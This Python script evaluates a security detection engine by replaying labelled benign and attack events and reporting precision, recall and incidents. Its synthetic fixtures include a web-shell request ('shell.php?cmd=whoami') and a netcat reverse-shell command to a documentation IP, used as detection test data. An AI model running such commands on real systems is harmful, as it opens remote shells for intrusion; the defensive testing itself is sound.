"""Separate benign/attack replays with explicit event truth; synthetic smoke data by default."""
import argparse
import json
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from telemetry import normalize_external
from engine import OnlineEngine
from incident_workflow import incident
from detection import RULES_VERSION


def replay(records):
    engine = OnlineEngine()
    tp = fp = fn = 0
    stages = set()
    for i, record in enumerate(sorted(records, key=lambda r: r['timestamp'])):
        truth = record['expected_family']
        event = normalize_external(record, record.get('scenario', 'fox'), 'evaluation.jsonl', i + 1)
        result = engine.ingest(event)
        positive = not event['training'] and result['family'] not in ('background', 'anomaly')
        correct = positive and result['family'] == truth
        tp += correct
        fp += positive and not correct
        fn += truth != 'background' and not correct
        if correct: stages.add(truth)
    return engine, {'events': len(records), 'true_alerts': tp, 'false_alerts': fp,
                    'missed_attack_events': fn, 'detected_stages': sorted(stages)}


def fixtures():
    benign = [{'timestamp': 1642996800 + i, 'host': 'server', 'src_ip': '192.0.2.5',
               'dns': {'rrname': 'www.example.org', 'rrtype': 'A'}, 'expected_family': 'background'} for i in range(2000)]
    attacks = []
    for i in range(3000):
        family = ('recon', 'execution', 'callback')[i // 1000]
        raw = {'recon': 'nmap port scan', 'execution': '', 'callback': ''}[family]
        record = {'timestamp': 1642996800 + i / 10, 'host': 'server', 'src_ip': '192.0.2.5',
                  'raw': raw, 'expected_family': family}
        if family == 'execution':
            record['raw'] = '192.0.2.5 - - [24/Jan/2022:04:00:00 +0000] "GET /shell.php?cmd=whoami HTTP/1.1" 200 1'
        if family == 'callback': record['process'] = {'command_line': 'nc 192.0.2.8 4444 -e /bin/sh'}
        attacks.append(record)
    return benign, attacks


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--benign', type=Path)
    parser.add_argument('--attacks', type=Path)
    parser.add_argument('--output', type=Path, default=Path(__file__).with_name('security-evaluation.json'))
    args = parser.parse_args()
    if bool(args.benign) != bool(args.attacks): parser.error('Supply both independent inputs')
    if args.benign:
        benign, attacks = ([json.loads(line) for line in p.read_text().splitlines() if line.strip()] for p in (args.benign, args.attacks))
    else: benign, attacks = fixtures()
    if any(r['expected_family'] != 'background' for r in benign): raise ValueError('Benign input has attack truth')
    _, b = replay(benign)
    engine, a = replay(attacks)
    seen, incidents = set(), []
    for gid, group in engine.groups.items():
        if gid in seen or not group['operational_unique'] or group['family'] in ('background', 'anomaly'): continue
        view = incident(engine, gid)
        ids = {g['id'] for g in view['groups']}
        seen.update(ids)
        incidents.append({'groups': sorted(ids), 'matched_records': sum(g['count'] - g['training'] for g in view['groups']),
                          'stages': sorted({g['family'] for g in view['groups']}), 'timeline': view['timeline'], 'edges': view['edges']})
    tp, fp = a['true_alerts'], a['false_alerts'] + b['false_alerts']
    report = {'rules_version': RULES_VERSION, 'source': 'explicitly labeled independent JSONL inputs' if args.benign else 'synthetic smoke fixtures; not empirical deployment accuracy',
              'benign': b, 'attacks': a, 'alert_precision': tp / (tp + fp) if tp + fp else None,
              'false_alerts_per_1000_benign_events': b['false_alerts'] * 1000 / b['events'] if b['events'] else None,
              'attack_event_recall': tp / (tp + a['missed_attack_events']) if tp + a['missed_attack_events'] else None,
              'incidents': incidents, 'incident_count': len(incidents),
              'limitations': ['Event-level metrics require explicit truth; attack windows alone cannot establish precision.',
                              'Recall counts the expected family on each event; aggregate detectors may miss early prefix events.',
                              'Incident links preserve evidence stages but do not prove causality.']}
    args.output.write_text(json.dumps(report, indent=2) + '\n')
    print(json.dumps({k:v for k,v in report.items() if k != 'incidents'}, indent=2))

if __name__ == '__main__': main()
